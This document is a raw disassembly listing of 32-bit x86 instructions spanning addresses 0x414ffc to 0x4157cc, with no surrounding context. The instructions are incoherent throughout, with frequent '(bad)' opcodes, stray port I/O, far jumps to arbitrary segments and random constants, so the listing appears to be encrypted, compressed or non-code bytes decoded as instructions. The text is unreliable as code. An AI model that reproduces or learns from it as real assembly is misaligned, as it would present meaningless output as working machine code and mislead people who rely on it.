  414ffc:	jmp    0x415079
  414ffe:	jbe    0x414f97
  415000:	mov    dh,0xa
  415002:	jle    0x414fbd
  415004:	scas   eax,DWORD PTR es:[edi]
  415005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415006:	(bad)  
  415007:	rcr    DWORD PTR [edi],1
  415009:	adc    dh,0x67
  41500c:	pop    ss
  41500d:	push   eax
  41500e:	iret   
  41500f:	aas    
  415010:	repz mov ebx,0xab95ac24
  415016:	mov    WORD PTR [esi+0x4f339bc4],gs
  41501c:	push   esp
  41501d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41501e:	outs   dx,BYTE PTR ds:[esi]
  41501f:	clc    
  415020:	mov    edi,0x6d6eca19
  415025:	mov    al,0xe3
  415027:	ins    DWORD PTR es:[edi],dx
  415028:	imul   esi,DWORD PTR [edx-0x14],0x13
  41502c:	add    BYTE PTR [ebp-0x1c408252],ch
  415032:	test   BYTE PTR [esi],bl
  415034:	mov    DWORD PTR [ebp*4-0x47bae461],esi
  41503b:	mov    eax,cs
  41503d:	fcom   st(2)
  41503f:	in     al,dx
  415040:	fsubr  QWORD PTR [edx+0x51bb3dee]
  415046:	mov    edx,0x5c1a937
  41504b:	es xchg ecx,eax
  41504d:	push   es
  41504e:	lock xor DWORD PTR [eax-0x1cf1ac7d],edi
  415055:	xchg   ecx,eax
  415056:	push   esi
  415057:	fild   WORD PTR [edx-0x6636d3d4]
  41505d:	push   es
  41505e:	(bad)  
  41505f:	ror    BYTE PTR [ebx],1
  415061:	sti    
  415062:	js     0x414ff5
  415064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415065:	in     al,dx
  415066:	mov    esi,0x528f50f0
  41506b:	dec    bx
  41506d:	xchg   edx,eax
  41506e:	out    0x55,al
  415070:	shl    BYTE PTR ds:[esi],0x74
  415074:	stos   DWORD PTR es:[edi],eax
  415075:	inc    esi
  415076:	iret   
  415077:	jnp    0x41501b
  415079:	xor    al,0x3d
  41507b:	(bad)  [ebx-0x21]
  41507e:	mov    esi,0x24b39a54
  415083:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  415085:	add    cl,dh
  415087:	or     al,bl
  415089:	test   DWORD PTR [edx],esp
  41508b:	push   ds
  41508c:	loop   0x41503b
  41508e:	outs   dx,BYTE PTR ds:[esi]
  41508f:	clc    
  415090:	fmul   QWORD PTR [edi-0x44]
  415093:	adc    bl,cl
  415095:	mov    bh,0x99
  415097:	push   eax
  415098:	or     eax,0x4b0469e1
  41509d:	scas   eax,DWORD PTR es:[edi]
  41509e:	jno    0x41509a
  4150a0:	xchg   ecx,eax
  4150a1:	(bad)  
  4150a2:	imul   edi,DWORD PTR [ebp-0x1aa3d5e2],0x5e
  4150a9:	push   ebx
  4150aa:	lods   eax,DWORD PTR ds:[esi]
  4150ab:	push   edx
  4150ac:	dec    edx
  4150ad:	add    ch,0x61
  4150b0:	dec    ecx
  4150b1:	(bad)  
  4150b2:	fistp  DWORD PTR [edi+0x7c7cdac2]
  4150b8:	mov    DWORD PTR [edx+ecx*1-0xe],edx
  4150bc:	cmp    al,0x36
  4150be:	jmp    0x4150d3
  4150c0:	(bad)  
  4150c1:	ficom  WORD PTR [eax-0xd1f80ba]
  4150c7:	js     0x415120
  4150c9:	add    DWORD PTR [esi],0xffffff94
  4150cc:	pop    edx
  4150cd:	cmc    
  4150ce:	dec    DWORD PTR [esi]
  4150d0:	fs pop ss
  4150d2:	call   0xb15f951a
  4150d7:	pop    ebx
  4150d8:	jle    0x4150e9
  4150da:	inc    ebp
  4150db:	stos   BYTE PTR es:[edi],al
  4150dc:	scas   al,BYTE PTR es:[edi]
  4150dd:	pop    eax
  4150de:	dec    ecx
  4150df:	arpl   bx,sp
  4150e1:	mov    al,0xe0
  4150e3:	test   al,0xf
  4150e5:	imul   ebx,ecx,0xffffff91
  4150e8:	ins    DWORD PTR es:[edi],dx
  4150e9:	pop    esi
  4150ea:	jo     0x415105
  4150ec:	mov    edx,0x60dc68b
  4150f1:	jbe    0x41516f
  4150f3:	push   edx
  4150f4:	add    BYTE PTR ds:0x27f1a1d4,ah
  4150fa:	ds and edi,eax
  4150fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150fe:	icebp  
  4150ff:	and    DWORD PTR [edi-0x597d60e0],edx
  415105:	lahf   
  415106:	ins    BYTE PTR es:[edi],dx
  415107:	xchg   esi,eax
  415108:	loopne 0x4150c4
  41510a:	(bad)  
  41510b:	(bad)  
  41510c:	arpl   WORD PTR [edx],dx
  41510e:	push   0x367895af
  415113:	loope  0x415185
  415115:	and    DWORD PTR [ebx+0x61],edx
  415118:	(bad)  [edx]
  41511a:	or     DWORD PTR [ecx-0x73],ebx
  41511d:	shl    dl,0x99
  415120:	ins    BYTE PTR es:[edi],dx
  415121:	mov    cl,0xfa
  415123:	daa    
  415124:	sbb    eax,0xf8fc068f
  415129:	lods   eax,DWORD PTR ds:[esi]
  41512a:	xchg   edi,eax
  41512b:	retf   
  41512c:	mov    BYTE PTR [ecx-0x14],0xd8
  415130:	xlat   BYTE PTR ds:[ebx]
  415131:	mov    cl,BYTE PTR [esi+0x1c]
  415134:	clc    
  415135:	aas    
  415136:	push   ds
  415137:	and    esi,esi
  415139:	push   ss
  41513a:	push   ds
  41513b:	jmp    0x84c9265
  415140:	push   ebp
  415141:	dec    eax
  415142:	add    eax,0xd12988c1
  415147:	mov    dl,0xa8
  415149:	adc    edx,0x32e519a4
  41514f:	les    ebp,FWORD PTR [esi-0x6b]
  415152:	adc    ebp,DWORD PTR [esi+eax*1+0x194d3e23]
  415159:	in     eax,0xd9
  41515b:	(bad)  
  41515c:	jae    0x415137
  41515e:	dec    ebx
  41515f:	jp     0x415154
  415161:	cli    
  415162:	push   edi
  415163:	jnp    0x41517d
  415165:	fdivr  DWORD PTR [edx+0x2e67b114]
  41516b:	arpl   WORD PTR [edi],sp
  41516d:	dec    eax
  41516e:	jo     0x415116
  415170:	inc    ebx
  415171:	pop    es
  415172:	inc    edi
  415173:	aas    
  415174:	dec    edx
  415175:	cmp    BYTE PTR [esi-0xaf21769],bh
  41517b:	adc    ebx,esp
  41517d:	push   edi
  41517e:	repz pop eax
  415180:	fsub   QWORD PTR [ecx]
  415182:	outs   dx,BYTE PTR ds:[esi]
  415183:	mov    esi,0x51cfc7d2
  415188:	dec    esi
  415189:	mov    eax,0xebe4150d
  41518e:	cmp    eax,0xb39c459c
  415193:	lahf   
  415194:	loopne 0x4151f8
  415196:	and    cl,cl
  415198:	or     edi,DWORD PTR ds:0xe7965218
  41519e:	dec    eax
  41519f:	fs ret 
  4151a1:	jmp    0x415141
  4151a3:	xchg   edx,eax
  4151a4:	pushf  
  4151a5:	cmp    ebp,ecx
  4151a7:	in     eax,0x42
  4151a9:	and    DWORD PTR [esp+ebx*2+0x47652596],ecx
  4151b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151b1:	xor    al,BYTE PTR [eax+0x35]
  4151b4:	and    eax,0x2d877410
  4151b9:	sub    BYTE PTR [esi-0x54],ch
  4151bc:	or     BYTE PTR [ebp-0x49],ch
  4151bf:	xchg   edx,eax
  4151c0:	repz pop esp
  4151c2:	cmp    ecx,DWORD PTR [ebx-0x40]
  4151c5:	nop
  4151c6:	call   0x53c:0x48459e4b
  4151cd:	xchg   ebp,eax
  4151ce:	in     al,dx
  4151cf:	rcl    DWORD PTR [edx],0xa7
  4151d2:	push   edi
  4151d3:	mov    ebx,0x31990293
  4151d8:	in     al,0x21
  4151da:	daa    
  4151db:	jecxz  0x41518c
  4151dd:	cdq    
  4151de:	lds    eax,FWORD PTR ds:0x511ab991
  4151e5:	sub    al,0x5d
  4151e7:	out    0x68,eax
  4151e9:	push   0x3c
  4151eb:	lds    ebp,FWORD PTR [ebp+0x7499ed57]
  4151f1:	sub    DWORD PTR ds:0xb9356ef3,esi
  4151f7:	sahf   
  4151f8:	in     al,dx
  4151f9:	clc    
  4151fa:	jl     0x415224
  4151fc:	xor    al,0xd8
  4151fe:	daa    
  4151ff:	repnz sbb DWORD PTR [esi+0x50],ecx
  415203:	repnz rep outs dx,DWORD PTR ds:[esi]
  415206:	push   ss
  415207:	jnp    0x415270
  415209:	das    
  41520a:	inc    ecx
  41520b:	add    BYTE PTR [ebx+0x589caee4],cl
  415211:	jmp    0xc7:0x373376c2
  415218:	(bad)  
  415219:	sbb    esi,DWORD PTR [eax+0x52593346]
  41521f:	mov    cl,0x3a
  415221:	push   0x3f00dde7
  415226:	sbb    dl,BYTE PTR [edx]
  415228:	jmp    0x41527e
  41522a:	mov    edx,0x4234fa13
  41522f:	xchg   ecx,eax
  415230:	push   0x16
  415232:	(bad)  
  415233:	je     0x41527f
  415235:	jnp    0x4151e1
  415237:	sub    bl,dh
  415239:	push   ecx
  41523a:	lods   eax,DWORD PTR ds:[esi]
  41523b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41523d:	cmp    eax,DWORD PTR [ecx+0x51]
  415240:	mov    edi,DWORD PTR [esi]
  415242:	jb     0x415297
  415244:	adc    eax,0xfd0a2d45
  415249:	inc    esp
  41524a:	pop    esi
  41524b:	mov    esp,0x9b7843eb
  415250:	pop    esp
  415251:	cwde   
  415252:	inc    edx
  415253:	cmp    al,0x64
  415255:	enter  0xfadf,0x4
  415259:	sbb    DWORD PTR [ebx],ebp
  41525b:	add    dl,al
  41525d:	mov    al,0x2c
  41525f:	mov    al,0x97
  415261:	adc    BYTE PTR [edx-0x79],bl
  415264:	pop    ebx
  415265:	icebp  
  415266:	jbe    0x4152bd
  415268:	and    bl,BYTE PTR [edi+eax*4]
  41526b:	mov    bl,0xac
  41526d:	adc    BYTE PTR [ebx+0x701189e5],ch
  415273:	std    
  415274:	add    ecx,DWORD PTR [eax+0x24]
  415277:	mov    ebx,0x27bdca76
  41527c:	cld    
  41527d:	jge    0x4152d2
  41527f:	ins    DWORD PTR es:[edi],dx
  415280:	cli    
  415281:	inc    ecx
  415282:	mov    dh,0xd1
  415284:	jle    0x4152db
  415286:	inc    edx
  415287:	xor    ax,0x8801
  41528b:	(bad)  
  41528c:	out    dx,eax
  41528d:	pop    ss
  41528e:	add    al,0x2b
  415290:	stc    
  415291:	lahf   
  415292:	out    dx,eax
  415293:	adc    ebp,esp
  415295:	scas   al,BYTE PTR es:[edi]
  415296:	mov    al,0x54
  415298:	or     al,0xc8
  41529a:	fimul  DWORD PTR [ebp+edx*1-0x27b86761]
  4152a1:	adc    eax,0xc43c3e68
  4152a6:	xor    DWORD PTR [eax+0x4e],esp
  4152a9:	push   0x855e3fb
  4152ae:	and    al,0x5
  4152b0:	pop    esi
  4152b1:	pop    edi
  4152b2:	and    DWORD PTR [eax+0x6b6ddf23],0xf571b1e
  4152bc:	mov    ds:0xec217ef1,al
  4152c1:	jmp    0x547b:0x3e78544b
  4152c8:	mov    ecx,0x12108610
  4152cd:	loope  0x4152d4
  4152cf:	rcr    BYTE PTR [ecx+ebx*4-0x14c72a3d],1
  4152d6:	dec    edx
  4152d7:	fxch   st(5)
  4152d9:	mov    eax,ds:0x1751e4af
  4152de:	xor    eax,0xe8a4be0f
  4152e3:	and    esi,DWORD PTR ds:0xfec7a4db
  4152e9:	xor    bh,bh
  4152eb:	ret    0x5545
  4152ee:	mov    ch,0x3c
  4152f0:	adc    dh,dh
  4152f2:	jmp    0x415359
  4152f4:	std    
  4152f5:	shl    BYTE PTR [edx],cl
  4152f7:	jp     0x41527b
  4152f9:	sub    edi,DWORD PTR [ebx-0x247b5587]
  4152ff:	dec    ebp
  415300:	push   edi
  415301:	retf   
  415302:	sbb    bh,bh
  415304:	packuswb mm5,QWORD PTR [ebp+0x10]
  415308:	hlt    
  415309:	daa    
  41530a:	xor    eax,DWORD PTR [edx]
  41530c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41530d:	dec    eax
  41530e:	lods   al,BYTE PTR ds:[esi]
  41530f:	shl    DWORD PTR [ebx-0x3af22bef],cl
  415315:	lock ins DWORD PTR es:[edi],dx
  415317:	fnstcw WORD PTR [edx-0x55]
  41531a:	jmp    0x5ec6d249
  41531f:	and    eax,0xbae4fc0e
  415324:	lahf   
  415325:	cdq    
  415326:	cli    
  415327:	cmp    DWORD PTR [esi],ebp
  415329:	push   esp
  41532a:	sub    DWORD PTR [eax+0x29],esi
  41532d:	les    ebp,FWORD PTR [edi+0x62]
  415330:	add    DWORD PTR [edi-0x4d369c7f],edi
  415336:	lock xor ah,BYTE PTR [ebp-0x1]
  41533a:	clc    
  41533b:	(bad)  
  41533c:	shl    BYTE PTR [ebx],0xf8
  41533f:	sbb    al,0xe9
  415341:	sbb    dh,BYTE PTR [ebx+edi*8]
  415344:	imul   edx,DWORD PTR [eax],0xffffffa3
  415347:	add    eax,0x34161514
  41534c:	stos   DWORD PTR es:[edi],eax
  41534d:	adc    eax,0xf564cb23
  415352:	adc    BYTE PTR [edx-0x4d],dl
  415355:	movhps QWORD PTR [ecx],xmm4
  415358:	cwde   
  415359:	inc    esi
  41535a:	(bad)  
  41535b:	mov    eax,0xf2f0c49
  415360:	push   eax
  415361:	retf   
  415362:	mov    bh,dl
  415364:	fcom   DWORD PTR [ecx]
  415366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415367:	jae    0x41537d
  415369:	int    0x1b
  41536b:	push   0xfa64c237
  415370:	and    al,0x39
  415372:	(bad)
  415376:	or     edi,DWORD PTR [ebx+ecx*1-0x4b]
  41537a:	call   0x54e4:0x538aa8d7
  415381:	outs   dx,DWORD PTR ds:[esi]
  415382:	or     DWORD PTR [esi],0xffffffc8
  415385:	out    0x41,eax
  415387:	sar    DWORD PTR [esi],cl
  415389:	jnp    0x41532e
  41538b:	repnz and DWORD PTR [edx],ecx
  41538e:	and    eax,0x4788dc1d
  415393:	jno    0x415362
  415395:	jge    0x415380
  415397:	jmp    0x3b98b0fd
  41539c:	adc    esp,esp
  41539e:	and    eax,DWORD PTR [edi+esi*4-0x317d1a33]
  4153a5:	leave  
  4153a6:	mov    bl,BYTE PTR [ebx+0x5baf8688]
  4153ac:	int3   
  4153ad:	cs scas eax,DWORD PTR es:[edi]
  4153af:	fsubrp st(2),st
  4153b1:	and    DWORD PTR cs:[ecx-0x7c5acb88],0x73
  4153b9:	retf   0x98e6
  4153bc:	rcl    BYTE PTR [edx-0x5],1
  4153bf:	leave  
  4153c0:	add    eax,0x94e173cc
  4153c5:	sbb    BYTE PTR [ecx],ah
  4153c7:	stc    
  4153c8:	mov    edx,0xe5da8922
  4153cd:	pusha  
  4153ce:	fimul  WORD PTR [ebx]
  4153d0:	pop    ecx
  4153d1:	sbb    BYTE PTR ds:[eax+0xb],dh
  4153d5:	neg    BYTE PTR [edx+0x31]
  4153d8:	dec    eax
  4153d9:	adc    ch,bh
  4153db:	mov    dh,BYTE PTR [ebp-0x3518fa39]
  4153e1:	stos   DWORD PTR es:[edi],eax
  4153e2:	ja     0x415421
  4153e4:	fst    st(6)
  4153e6:	arpl   WORD PTR [esi+0x572026f7],bx
  4153ec:	push   cs
  4153ed:	xor    eax,0x236a6aad
  4153f2:	push   eax
  4153f3:	inc    edx
  4153f4:	jge    0x4153d2
  4153f6:	lea    esi,[esi-0x60]
  4153f9:	inc    ecx
  4153fa:	repnz cwde 
  4153fc:	(bad)  
  4153fd:	arpl   WORD PTR ds:0x795f972a,sp
  415403:	fild   WORD PTR [ebx]
  415405:	rol    BYTE PTR [edi],cl
  415407:	lods   eax,DWORD PTR ds:[esi]
  415408:	call   0xbd37c358
  41540d:	imul   esp,DWORD PTR [edi],0xffffff94
  415410:	add    al,0x56
  415412:	ret    0x258c
  415415:	popf   
  415416:	in     eax,dx
  415417:	bound  esp,QWORD PTR [ecx+0xc71a223]
  41541d:	(bad)  
  41541e:	mov    DWORD PTR [esi],edx
  415420:	adc    dh,BYTE PTR [esi+0x2b]
  415423:	pusha  
  415424:	out    0xe2,eax
  415426:	pop    ds
  415427:	add    BYTE PTR [eax+ebp*2+0x47],bh
  41542b:	sbb    al,0xe9
  41542d:	jnp    0x415499
  41542f:	pop    ss
  415430:	or     ch,BYTE PTR [ebp+edx*8-0x28]
  415434:	jo     0x415421
  415436:	and    DWORD PTR [eax+ecx*2-0x702785],edi
  41543d:	leave  
  41543e:	and    BYTE PTR [edi-0x555530e8],al
  415444:	and    eax,0x58b2183e
  415449:	pop    ebx
  41544a:	rcr    esi,cl
  41544c:	js     0x41544a
  41544e:	imul   ebx,DWORD PTR [ebp+0x6e],0xffffff86
  415452:	adc    DWORD PTR [ebp+0x7e],esp
  415455:	fsub   st,st(2)
  415457:	mov    DWORD PTR [eax+ebx*2-0x44f90571],eax
  41545e:	push   edi
  41545f:	cmp    eax,0x39481a90
  415464:	mov    cl,0xd6
  415466:	in     eax,dx
  415467:	push   esi
  415468:	dec    edi
  415469:	push   edi
  41546a:	(bad)  
  41546b:	out    dx,al
  41546c:	or     BYTE PTR [esi],ah
  41546e:	jns    0x415472
  415470:	xor    eax,0xb504cf71
  415475:	xchg   esi,eax
  415476:	hlt    
  415477:	and    DWORD PTR [ebp+0x5b],edi
  41547a:	cmp    cl,dl
  41547c:	cs pop ecx
  41547e:	fadd   DWORD PTR [eax+eiz*1]
  415481:	add    al,0x79
  415483:	cmp    ch,bh
  415485:	stos   DWORD PTR es:[edi],eax
  415486:	mov    bl,0xcd
  415488:	outs   dx,BYTE PTR ds:[esi]
  415489:	aad    0x95
  41548b:	inc    edx
  41548c:	sub    eax,0x64e98792
  415491:	or     DWORD PTR [ebx+0x6],ecx
  415494:	mov    eax,ds:0xc9cd0894
  415499:	ds retf 0x9cf
  41549d:	dec    esi
  41549e:	shl    DWORD PTR [ecx-0x5b],cl
  4154a1:	in     al,dx
  4154a2:	js     0x415439
  4154a4:	sahf   
  4154a5:	call   0xd680:0x7413994b
  4154ac:	int3   
  4154ad:	clc    
  4154ae:	stos   DWORD PTR es:[edi],eax
  4154af:	mov    dl,0x48
  4154b1:	es leave 
  4154b3:	sti    
  4154b4:	out    0x25,eax
  4154b6:	pop    ebp
  4154b7:	nop
  4154b8:	sub    DWORD PTR [ebp-0x4a6e52c4],edx
  4154be:	xchg   ebx,eax
  4154bf:	(bad)  
  4154c0:	jno    0x4154ab
  4154c2:	loop   0x415517
  4154c4:	stos   BYTE PTR es:[edi],al
  4154c5:	push   0x28
  4154c7:	enter  0x87f5,0x20
  4154cb:	mov    ds:0x14bc851f,eax
  4154d0:	test   ah,ch
  4154d2:	aaa    
  4154d3:	jle    0x415548
  4154d5:	neg    DWORD PTR [eax]
  4154d7:	xor    DWORD PTR [eax+0x528c3e0a],esp
  4154dd:	lea    edx,[ecx+0x3e]
  4154e0:	int3   
  4154e1:	jae    0x41550e
  4154e3:	stos   BYTE PTR es:[edi],al
  4154e4:	pusha  
  4154e5:	push   esi
  4154e6:	fcom   QWORD PTR [ecx-0x273cb076]
  4154ec:	or     DWORD PTR ds:0xf56881f6,ebx
  4154f2:	and    DWORD PTR [ecx-0x5d],edi
  4154f5:	loope  0x415561
  4154f7:	mov    ebx,0xea43877f
  4154fc:	in     al,0x90
  4154fe:	xlat   BYTE PTR ds:[ebx]
  4154ff:	push   ecx
  415500:	push   es
  415501:	bound  ecx,QWORD PTR [edi]
  415503:	push   cs
  415504:	pushf  
  415505:	xor    eax,0xb9cccbb
  41550a:	pop    es
  41550b:	std    
  41550c:	cmp    al,BYTE PTR [eax+0x36fc3ab2]
  415512:	push   es
  415513:	adc    bl,0xef
  415516:	dec    ebp
  415517:	lea    edx,[edx-0x2f]
  41551a:	pop    esi
  41551b:	jle    0x4154a6
  41551d:	fistp  WORD PTR [ecx-0x15038589]
  415523:	scas   eax,DWORD PTR es:[edi]
  415524:	pop    es
  415525:	(bad)
  415529:	cmp    BYTE PTR [ecx],ah
  41552b:	mov    esi,0x3289c74d
  415530:	mov    esi,esi
  415532:	out    dx,eax
  415533:	stos   DWORD PTR es:[edi],eax
  415534:	cdq    
  415535:	mov    dh,0x28
  415537:	sub    bh,BYTE PTR [ecx+0x6f]
  41553a:	repz inc ecx
  41553c:	out    0x4d,al
  41553e:	adc    DWORD PTR [edi],0xd
  415541:	jmp    0x415521
  415543:	and    dh,bl
  415545:	sbb    al,0x47
  415547:	add    ah,BYTE PTR [ebp-0x79b3fc55]
  41554d:	jle    0x415536
  41554f:	push   edx
  415550:	or     esp,DWORD PTR [esi-0x4480bcd9]
  415556:	mov    edx,0x3d3308d8
  41555b:	pop    ds
  41555c:	or     bh,BYTE PTR fs:[eax+0x3d9e4ff6]
  415563:	cmp    eax,0xfbe1b8f3
  415568:	fiadd  DWORD PTR [edi+0x6d]
  41556b:	mov    ds:0x709aa446,al
  415570:	in     al,dx
  415571:	or     al,0x98
  415573:	lahf   
  415574:	adc    al,0xd6
  415576:	cvttps2pi mm4,QWORD PTR ds:0xa2818c67
  41557d:	push   esp
  41557e:	jno    0x415557
  415580:	addr16 cli 
  415582:	jae    0x415526
  415584:	xchg   esp,eax
  415585:	jns    0x4155de
  415587:	psubb  mm7,QWORD PTR [esi-0x5f]
  41558b:	add    ecx,DWORD PTR ds:0x235ac98b
  415591:	mov    edx,0x5730ee73
  415596:	fadd   QWORD PTR [eax]
  415598:	cmp    BYTE PTR [ebp-0x2c],cl
  41559b:	arpl   WORD PTR [ebp-0x4ef3aa69],di
  4155a1:	loope  0x4155be
  4155a3:	xchg   esi,eax
  4155a4:	nop
  4155a5:	pop    eax
  4155a6:	adc    eax,0x7cc184ab
  4155ab:	scas   al,BYTE PTR es:[edi]
  4155ac:	sub    cl,BYTE PTR [ebx-0x4fb2b17b]
  4155b2:	push   ebx
  4155b3:	shl    BYTE PTR [ebp+esi*4-0x1f20cd5],0x6f
  4155bb:	sub    eax,0xffea06fa
  4155c0:	mov    ecx,0x94255b24
  4155c5:	retf   0x54f4
  4155c8:	and    ah,dl
  4155ca:	add    cl,BYTE PTR [edx]
  4155cc:	fwait
  4155cd:	mov    edi,DWORD PTR ds:0xcf39e6af
  4155d3:	cwde   
  4155d4:	jecxz  0x4155fb
  4155d6:	clc    
  4155d7:	xchg   edx,eax
  4155d8:	mov    ds:0xfd967bd0,eax
  4155dd:	gs pusha 
  4155df:	shl    ebx,1
  4155e1:	lods   eax,DWORD PTR ds:[esi]
  4155e2:	dec    ebx
  4155e3:	scas   al,BYTE PTR es:[edi]
  4155e4:	mov    ?,WORD PTR [edi]
  4155e6:	repz or BYTE PTR [eax],cl
  4155e9:	mov    ebx,0x3f051025
  4155ee:	lock or edx,esi
  4155f1:	retf   0x4f8b
  4155f4:	pop    edi
  4155f5:	sub    al,bh
  4155f7:	dec    ecx
  4155f8:	div    DWORD PTR [ebx-0x62]
  4155fb:	cmc    
  4155fc:	sti    
  4155fd:	test   BYTE PTR [ebx-0x7f3588d],0xdd
  415604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415605:	mov    DWORD PTR [ebp-0x3626b20b],edi
  41560b:	pop    ebp
  41560c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41560d:	pop    esi
  41560e:	adc    ebx,esp
  415610:	lock pushf 
  415612:	arpl   WORD PTR [eax+0x9],sp
  415615:	mov    eax,ss:0x735fa0c5
  41561b:	push   eax
  41561c:	ret    
  41561d:	(bad)  
  41561e:	fcom   DWORD PTR [ebp+0x3a5c0448]
  415624:	push   edi
  415625:	xchg   edx,eax
  415626:	push   ebx
  415627:	sbb    eax,DWORD PTR [edi+0x49]
  41562a:	push   es
  41562b:	and    ebx,DWORD PTR [esi]
  41562d:	xor    ebp,ecx
  41562f:	(bad)  
  415630:	(bad)  
  415631:	push   eax
  415632:	popf   
  415633:	xchg   edi,eax
  415634:	jo     0x415623
  415636:	xchg   edx,eax
  415637:	dec    edx
  415638:	jmp    0x415607
  41563a:	das    
  41563b:	pop    ds
  41563c:	scas   eax,DWORD PTR es:[edi]
  41563d:	aaa    
  41563e:	(bad)  
  41563f:	cwde   
  415640:	xor    eax,DWORD PTR [esi]
  415642:	in     eax,0x8f
  415644:	and    BYTE PTR [ebx-0x62c872a1],al
  41564a:	xchg   ebx,eax
  41564b:	fcomip st,st(1)
  41564d:	sbb    BYTE PTR [edx+0x7b],ch
  415650:	jle    0x4155f7
  415652:	retf   
  415653:	aas    
  415654:	mov    dh,0xda
  415656:	int3   
  415657:	mov    al,ds:0xeccdc642
  41565c:	jns    0x415664
  41565e:	jl     0x4155e8
  415660:	mov    ah,0x1a
  415662:	pop    edi
  415663:	xlat   BYTE PTR ds:[ebx]
  415664:	mov    BYTE PTR [ebx],bl
  415666:	(bad)  
  415667:	xchg   ecx,eax
  415668:	pop    ebx
  415669:	sub    eax,esp
  41566b:	add    eax,DWORD PTR ds:0x6c40b543
  415671:	xchg   esp,eax
  415672:	repz out 0x0,eax
  415675:	jmp    0x5e04:0xcedbe6f4
  41567c:	xor    al,0x3
  41567e:	mov    DWORD PTR [ebx-0x7a],ebx
  415681:	fist   DWORD PTR [eax+0x68e8d19e]
  415687:	or     eax,DWORD PTR [edx]
  415689:	add    DWORD PTR [ecx],0x58ca2411
  41568f:	nop
  415690:	shl    esi,1
  415692:	(bad)  
  415693:	push   ecx
  415694:	cli    
  415695:	(bad)  
  415696:	mov    edx,0x9f64a3ea
  41569b:	(bad)  
  41569c:	dec    esp
  41569d:	mov    al,ds:0x5b27fecd
  4156a2:	mov    cl,0x87
  4156a4:	push   ebx
  4156a5:	mov    DWORD PTR [esi],esp
  4156a7:	lahf   
  4156a8:	call   0x7e1d:0x3a77341f
  4156af:	pop    ds
  4156b0:	dec    ebp
  4156b1:	cmp    al,0x6d
  4156b3:	inc    ebp
  4156b4:	xor    BYTE PTR [ebx-0x43],0x7e
  4156b8:	adc    al,0x74
  4156ba:	fild   QWORD PTR [esi-0x4e]
  4156bd:	cld    
  4156be:	inc    ebx
  4156bf:	sub    al,0xfe
  4156c1:	pop    ecx
  4156c2:	xchg   BYTE PTR [esi+edi*4+0x61],al
  4156c6:	sbb    edx,ebp
  4156c8:	loop   0x4156cd
  4156ca:	jmp    0x415689
  4156cc:	lds    eax,FWORD PTR [ecx-0x47e4d8ee]
  4156d2:	dec    ebp
  4156d3:	cmp    cl,BYTE PTR [ebp+0x7279c89c]
  4156d9:	inc    ebp
  4156da:	test   al,0x52
  4156dc:	into   
  4156dd:	outs   dx,BYTE PTR ds:[esi]
  4156de:	cmp    DWORD PTR [edx+0x268a85f],edi
  4156e4:	mov    ds:0xff88ce5d,eax
  4156e9:	push   esi
  4156ea:	pop    esi
  4156eb:	call   0x7a95:0x5de84aab
  4156f2:	imul   esi,DWORD PTR [edi-0x66],0xdd58ec8e
  4156f9:	xor    al,0xdb
  4156fb:	pop    ecx
  4156fc:	dec    DWORD PTR [ecx-0x14]
  4156ff:	pusha  
  415700:	xchg   esi,eax
  415701:	push   0xfffffff8
  415703:	mov    dl,0xf5
  415705:	dec    esi
  415706:	std    
  415707:	xor    eax,0x64e49be8
  41570c:	mov    ss,WORD PTR [edx+ecx*8+0x2c]
  415710:	mov    ds:0x5acefd0f,al
  415715:	int3   
  415716:	mov    esi,0x401f705f
  41571b:	add    BYTE PTR [edx+ecx*1-0x59],bh
  41571f:	mov    bh,0xee
  415721:	mov    ah,0xfb
  415723:	and    dl,dl
  415725:	inc    edi
  415726:	push   ebp
  415727:	inc    edx
  415728:	push   0x64809a42
  41572d:	and    cl,BYTE PTR [esi]
  41572f:	inc    esi
  415730:	call   0xf1ba:0x4c1715a5
  415737:	test   eax,0xa36f67ec
  41573c:	mov    BYTE PTR [edx-0x7a],0x61
  415740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415741:	jo     0x415730
  415743:	adc    DWORD PTR [ebp-0x3b],ebx
  415746:	cmp    eax,0x2401b02d
  41574b:	or     BYTE PTR [edi+0x34443e36],al
  415751:	inc    edi
  415752:	repnz pop ecx
  415754:	push   ebp
  415755:	sbb    DWORD PTR [edx+0x7ad500ce],esi
  41575b:	hlt    
  41575c:	test   bh,bl
  41575e:	jbe    0x4156e6
  415760:	(bad)  
  415761:	lods   al,BYTE PTR ds:[esi]
  415762:	adc    ebp,esp
  415764:	jmp    0x23b6:0x26187bc
  41576b:	cmp    al,0x39
  41576d:	loope  0x415726
  41576f:	push   cs
  415770:	xor    eax,DWORD PTR [ebp+edx*4+0x2b]
  415774:	cmp    al,0x1f
  415776:	push   ecx
  415777:	sbb    dl,BYTE PTR ds:0x43165dd6
  41577d:	dec    esp
  41577e:	xchg   esi,eax
  41577f:	push   ecx
  415780:	or     ebx,DWORD PTR [ecx-0x1f]
  415783:	jb     0x41572d
  415785:	test   dl,ch
  415787:	popf   
  415788:	in     al,dx
  415789:	or     edx,DWORD PTR [esi-0x668cdb39]
  41578f:	dec    esp
  415790:	loopne 0x4157ff
  415792:	fwait
  415793:	or     BYTE PTR [edi],0x31
  415796:	stos   DWORD PTR es:[edi],eax
  415797:	or     BYTE PTR [ecx+0x38f699d9],dh
  41579d:	push   ds
  41579e:	mov    edx,0xde54fcff
  4157a3:	adc    al,0x68
  4157a5:	shr    eax,1
  4157a7:	adc    DWORD PTR [ebx+0xcca30fe],edx
  4157ad:	outs   dx,BYTE PTR ds:[esi]
  4157ae:	jecxz  0x41580e
  4157b0:	inc    BYTE PTR [edx]
  4157b2:	push   eax
  4157b3:	stos   BYTE PTR es:[edi],al
  4157b4:	xor    al,0x7c
  4157b6:	mov    esp,0x88e8aba8
  4157bb:	(bad)  
  4157bc:	jmp    0x82831b52
  4157c1:	rcr    DWORD PTR [ebx],0x45
  4157c4:	xor    DWORD PTR [ecx+0x58d467a5],esi
  4157ca:	sbb    al,0x7
  4157cc:	shr    esi,1
